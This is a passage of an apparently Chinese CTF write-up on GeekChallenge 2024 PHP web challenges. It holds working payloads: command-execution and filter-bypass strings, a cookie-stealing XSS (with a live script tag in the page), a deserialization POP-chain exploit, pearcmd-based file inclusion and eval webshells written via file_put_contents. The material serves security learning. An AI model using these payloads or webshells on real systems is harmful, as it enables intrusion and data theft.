class="hljs-string">&#x27;se64&#x27;</span>)<span class="hljs-punctuation">|</span>attr(<span class="hljs-string">&#x27;re&#x27;</span><span class="hljs-string">&#x27;ad&#x27;</span>)())<span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><h3 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h3><p><a href="https://blog.csdn.net/2301_76690905/article/details/134533626?ops_request_misc=%7B%22request_id%22:%22883D7557-B54F-4D9F-B485-C93EAC6D9E1C%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=883D7557-B54F-4D9F-B485-C93EAC6D9E1C&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-134533626-null-null.142%5Ev100%5Epc_search_result_base5&utm_term=flag%E9%87%8D%E5%A4%8D%E7%BB%95%E8%BF%87&spm=1018.2226.3001.4187">命令执行RCE及其绕过详细总结（各情景下的绕过）_命令执行绕过-CSDN博客</a></p><p><img src="/../images/image-20250325215422870.png" alt="image-20250325215422870"> </p><p><code>md5(&quot;Geekchallenge2024_bmKtL&quot;)</code>就是经典0e，找一个数字sha1后0e的<br>当PHP版本小于8时，如果参数中出现中括号[，中括号会被转换成下划线_</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_</span>[<span class="hljs-number">2024</span>.geekchallenge.ctf=<span class="hljs-number">0</span>e1290633704<br></code></pre></td></tr></table></figure><p><img src="/../images/image-20250325220609080.png" alt="image-20250325220609080"> </p><p>变量覆盖，后面的在get传对应参数名</p><p><img src="/../images/image-20250325221127949.png" alt="image-20250325221127949"> </p><p>科学计数法中e在intval时解析成字母，截断转换，而在加法中正常表现为科学计数法</p><p>intval函数<strong>不能正常解析字符串形式的科学表达式</strong>，会返回底数<br><code>intval($year)</code>解析字符串<code>&#39;2023e2&#39;</code>返回2023<br>后面的是<code>$year+1</code>，数字和字符串相加，php会把字符串转为数字再相加，所以就会被解析为2023*2023</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">year</span>=2023e2&amp;purpose[]=rce&amp;<span class="hljs-attribute">code</span>=system(&#x27;cat /flag<span class="hljs-string">&#x27;);</span><br></code></pre></td></tr></table></figure><p>purpose传数组就行，preg_match无法处理数组</p><p>输入<code>purpose=rce</code>也可以，</p><p>正则表达式 <code>/.+?rce/ism</code> 可以拆解成以下部分：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">. </span>：表示匹配任何单个字符（除了换行符）。<br>+ ：表示匹配前面的字符（在这里是 . ）一次或多次。即 . 会匹配一个或多个任意字符。<br>? ：是一个“懒惰模式”（非贪婪匹配），意味着匹配尽可能少的字符。与 + 一起使用时，表示尽可能少地匹配字符。<br>.+? ：表示匹配一个或多个任意字符（但尽可能少匹配）。这意味着它会尽量少地匹配字符，直到遇到“rce”字符串为止。<br><br>修饰符 ism ：<br>i ：表示匹配时不区分大小写。<br>s ：表示让 . 能够匹配换行符。<br>m ：表示多行模式， ^ 和 $ 分别匹配行首和行尾，而不是字符串的开始和结束。<br></code></pre></td></tr></table></figure><p><code>purpose=rce</code>可任意绕过正则匹配</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">.+<span class="hljs-string">?：</span>要求在 rce 前至少有一个字符，但 rce 自身没有前导字符。因此，不会匹配。<br></code></pre></td></tr></table></figure><p>eval执行命令</p><p><img src="/../images/image-20250325220515228.png" alt="image-20250325220515228"> </p><h3 id="Problem-On-My-Web"><a href="#Problem-On-My-Web" class="headerlink" title="Problem_On_My_Web"></a><strong>Problem_On_My_Web</strong></h3><p>反射型XSS，留言板过滤不严导致XSS</p><script>alert(document.cookie);</script><p><img src="/../images/image-20250326214745353.png" alt="image-20250326214745353"> </p><p><code>url=http://127.0.0.1</code>  触发攻击，在XSS平台拿到cookie，内含flag：</p><p><img src="/../images/image-20250326220049175.png" alt="image-20250326220049175"> </p><h3 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h3><p><strong><code>__call</code> 方法</strong>：当调用对象中不存在的方法时触发</p><p><strong><code>__destruct</code> 方法</strong>：对象销毁时触发</p><p><strong><code>__invoke</code> 方法</strong>：对象被当作函数调用时触发</p><p><strong><code>__get</code> 方法</strong>：访问对象中不存在的属性时触发</p><p><strong><code>__toString</code> 方法</strong>：对象被当作字符串使用时触发</p><p><strong><code>file_put_contents</code></strong> <strong>函数</strong>：用于将一个字符串写入到文件中。用于简单的文件写入操作。</p><p><a href="https://xz.aliyun.com/news/7758?u_atoken=e1321d7b58a5a5b3a6b68ab75ca9cbd2&u_asig=0a47315217432365705158965e007a">file_put_content和死亡·杂糅代码之缘-先知社区 (aliyun.com)</a></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs swift">file_put_contents(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$content</span>);<br>file_put_contents(<span class="hljs-variable">$content</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$content</span>);<br>file_put_contents(<span class="hljs-variable">$filename</span>,<span class="hljs-variable">$content</span> . <span class="hljs-string">&quot;<span class="hljs-subst">\n</span>xxxxxx&quot;</span>);<br></code></pre></td></tr></table></figure><p>思路一般是想要将杂糅或者死亡代码分解掉；利用php伪协议filter，结合编码或者相应的过滤器进行绕过；其原理就是将死亡或者杂糅代码分解成php无法识别的代码；</p><p><strong>1.base64编码绕过</strong></p><p>利用base64解码，将死亡代码解码成乱码，使得php引擎无法识别</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$filename=<span class="hljs-string">&#x27;php://filter/convert.base64-decode/resource=s1mple.php&#x27;</span><span class="hljs-comment">;</span><br>$content = <span class="hljs-string">&#x27;aPD9waHAgcGhwaW5mbygpOz8+&#x27;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>这里之所以将$content加了一个a，是因为base64在解码的时候是将4个字节转化为3个字节，又因为死亡代码只有phpexit参与了解码，所以补上一位就可以完全转化。</p><p><strong>2.rot13 编码绕过</strong></p><p>原理和base64一样，可以直接转码分解死亡代码；</p><p>但是，因为我们生成的文件内容之中前面的<code>&lt;?</code>并没有分解掉，这时，如果服务器开启了短标签，那么就会被解析，所以所以后面的代码就会错误，也就失去了作用。</p><p><strong>3. htaccess的预包含利用</strong></p><p>利用 .htaccess的预包含文件的功能来进行攻破；自定义包含我们的flag文件。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$filename</span>=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=string.strip_tags/</span>resource=.htaccess   <br><span class="hljs-regexp">//</span>这里引用了string.strip_tags过滤器，可以过滤.htaccess内容的html标签，自然也就消除了死亡代码；<br><br><span class="hljs-variable">$content</span>=?&gt;php_value%<span class="hljs-number">20</span>auto_prepend_file%<span class="hljs-number">20</span>G:\s1mple.php     <br><span class="hljs-regexp">//</span><span class="hljs-variable">$content</span>即闭合死亡代码使其完全消除，并且写入自定义包含文件<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>Class SYC&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$starven</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/%|iconv|UCS|UTF|rot|quoted|base|zlib|zip|read/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;starven))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no hack&#x27;</span>);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;starven,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$this</span>-&gt;starven);<br>    &#125;<br>    <span class="hljs-comment">//死亡exit的绕过，由于黑名单过滤的很全，这里就尝试strip_tags写入htaccess，预包含</span><br>&#125;<br><br>Class lover&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$J1rry</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$meimeng</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;J1rry)&amp;&amp;<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;J1rry)==<span class="hljs-string">&#x27;Welcome GeekChallenge 2024&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;meimeng-&gt;source;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;meimeng;<br>    &#125;<br>    <span class="hljs-comment">//让 $meimeng 指向 SYC 类的对象，然后调用 SYC 类对象的一个不存在的方法，就是Geek类里的Getflag()，从而触发 __call 方法。</span><br><br>&#125;<br><br>Class Geek&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$GSBP</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>        <span class="hljs-variable">$Challenge</span> = <span class="hljs-variable language_">$this</span>-&gt;GSBP;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$Challenge</span>();<br>    &#125;<br>    <span class="hljs-comment">//当访问类中不存在的属性时，__get方法会被触发。此方法会把$GSBP的值赋给$Challenge，然后将$Challenge作为可调用的函数  或者方法来执行，触发__invoke方法。   </span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;GSBP-&gt;<span class="hljs-title function_ invoke__">Getflag</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Just do it&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>])&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/meimeng/i&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no hack&quot;</span>);<br>    &#125;<br>   <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>   <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>Class SYC&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$starven</span>;<br> <br>&#125;<br>Class lover&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$J1rry</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$meimeng</span>;<br><br>&#125;<br><br>Class Geek&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$GSBP</span>;<br><br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lover</span>();<br><span class="hljs-variable">$a</span>-&gt;J1rry=<span class="hljs-string">&quot;data://text/plain,Welcome GeekChallenge 2024&quot;</span>;   <span class="hljs-comment">//用data伪协议</span><br><span class="hljs-variable">$a</span>-&gt;meimeng=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Geek</span>();<br><span class="hljs-variable">$a</span>-&gt;meimeng-&gt;GSBP=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lover</span>();<br><span class="hljs-variable">$a</span>-&gt;meimeng-&gt;GSBP-&gt;meimeng=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Geek</span>();<br><span class="hljs-variable">$a</span>-&gt;meimeng-&gt;GSBP-&gt;meimeng-&gt;GSBP=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SYC</span>();<br><span class="hljs-variable">$a</span>-&gt;meimeng-&gt;GSBP-&gt;meimeng-&gt;GSBP-&gt;starven=<span class="hljs-string">&quot;php://filter/write=string.strip_tags/?&gt;php_value auto_prepend_file /flag&lt;/resource=.htaccess&quot;</span>;  <br><span class="hljs-variable">$exp</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;s:7:&quot;meimeng&quot;&#x27;</span>,<span class="hljs-string">&#x27;S:7:&quot;\6d\65\69\6d\65\6e\67&quot;&#x27;</span>,<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));  <span class="hljs-comment">//16进制绕过meimeng</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$exp</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/image-20250329180701245.png" alt="image-20250329180701245"></p><h3 id="ez-include"><a href="#ez-include" class="headerlink" title="ez_include"></a>ez_include</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>starven_secret.php<br></code></pre></td></tr></table></figure><p>base64解码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$secret</span> = <span class="hljs-string">&quot;congratulation! you can goto /levelllll2.php to capture the flag!&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>访问&#x2F;levelllll2.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span> [<span class="hljs-string">&quot;syc&quot;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span> [<span class="hljs-string">&quot;syc&quot;</span>];<br>    <span class="hljs-variable">$hint</span> = <span class="hljs-string">&quot;register_argc_argv = On&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/config|create|filter|download|phar|log|sess|-c|-d|%|data/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hint都给的这么明显了还不会做?&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>], -<span class="hljs-number">4</span>) === <span class="hljs-string">&#x27;.php&#x27;</span>)&#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>远程文件包含</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?+</span>config-create+<span class="hljs-regexp">/&amp;syc=/usr</span><span class="hljs-regexp">/local/lib</span><span class="hljs-regexp">/php/pearcmd</span>.php&amp;<span class="hljs-regexp">/&lt;?=eval($_GET[1]);?&gt;+/tmp</span><span class="hljs-regexp">/1.php</span><br></code></pre></td></tr></table></figure><p>bp抓包，&lt;&gt;和单引号会被url编码，需要修改的</p><p><img src="/../images/image-20250329185849154.png" alt="image-20250329185849154"></p><p>查看环境变量</p><p><img src="/../images/image-20250329190000662.png" alt="image-20250329190000662"></p><h3 id="ez-SSRF"><a href="#ez-SSRF" class="headerlink" title="ez_SSRF"></a>ez_SSRF</h3><p>dirsearch进行目录扫描，看到<code>www.zip</code></p><p>![屏幕截图 2025-03-31 192334](..&#x2F;images&#x2F;屏幕截图 2025-03-31 192334.png) </p><p><code>/www.zip</code>得到三个文件</p><p>calculator.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$admin</span>=<span class="hljs-string">&quot;aaaaaaaaaaaadmin&quot;</span>;<br><span class="hljs-variable">$adminpass</span>=<span class="hljs-string">&quot;i_want_to_getI00_inMyT3st&quot;</span>;<br><br><span class="hljs-comment">//定义一个用于检查 HTTP 认证信息的函数</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$auth</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$admin</span>,<span class="hljs-variable">$adminpass</span>;<br>    <span class="hljs-variable">$auth</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;Basic &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$auth</span>);<span class="hljs-comment">//移除 $auth 字符串中的 Basic 前缀</span><br>    <span class="hljs-variable">$auth</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$auth</span>);<span class="hljs-comment">//对经过 Base64 编码的认证信息进行解码</span><br>    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>) = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-variable">$auth</span>);<span class="hljs-comment">//冒号分割</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span>===<span class="hljs-variable">$admin</span> &amp;&amp; <span class="hljs-variable">$password</span>===<span class="hljs-variable">$adminpass</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//HTTP的内容需要加上Basic 前缀，并将aaaaaaaaaaaadmin:i_want_to_getI00_inMyT3st进行base64编码</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]!==<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Hacker&quot;</span>);<br>&#125;<br><span class="hljs-comment">//请求的客户端 IP 地址需要为本地地址 127.0.0.1</span><br><br><span class="hljs-variable">$expression</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;expression&#x27;</span>];<span class="hljs-comment">//从 POST 请求中获取用户输入的数学表达式</span><br><span class="hljs-variable">$auth</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_AUTHORIZATION&#x27;</span>];<span class="hljs-comment">//从 HTTP 请求头中获取认证信息</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$auth</span>))&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$auth</span>)===<span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[0-9+\-*\/]+$/&#x27;</span>, <span class="hljs-variable">$expression</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Invalid expression&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$result</span>=<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$expression</span>;&quot;</span>);<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;result&quot;</span>,<span class="hljs-variable">$result</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$result</span>=<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$expression</span>;&quot;</span>);<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;result&quot;</span>,<span class="hljs-variable">$result</span>);<br>    &#125;<br>    <span class="hljs-comment">//POST传参的 expression，eval函数会执行任意的 PHP 代码，，执行恶意代码传shell。但这个代码需要满足前面的身份认证，而且使用file_put_contents 函数，向shell.php写入一句话木马，并进行base64编码绕过</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Hacker&quot;</span>);，<br>&#125;<br></code></pre></td></tr></table></figure><p>HTTP头为AUTHORIZATION（请求头的冒号后要有空格）</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">AUTHORIZATION:</span> Basic aaaaaaaaaaaadmin:i_want_to_getI00_inMyT3st<br><span class="hljs-symbol">AUTHORIZATION:</span> Basic YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0<br></code></pre></td></tr></table></figure><p>POST传参的 expression</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">expression=file_put_contents(&#x27;shell.php&#x27;,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">)</span><br><span class="language-xml">expression=file_put_contents(&#x27;shell.php&#x27;,base64_decode(&#x27;PD9waHAgQGV2YWwoJF9SRVFVRVNUWydjbWQnXSk7Pz4=&#x27;))</span><br></code></pre></td></tr></table></figure><p>h4d333333.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span 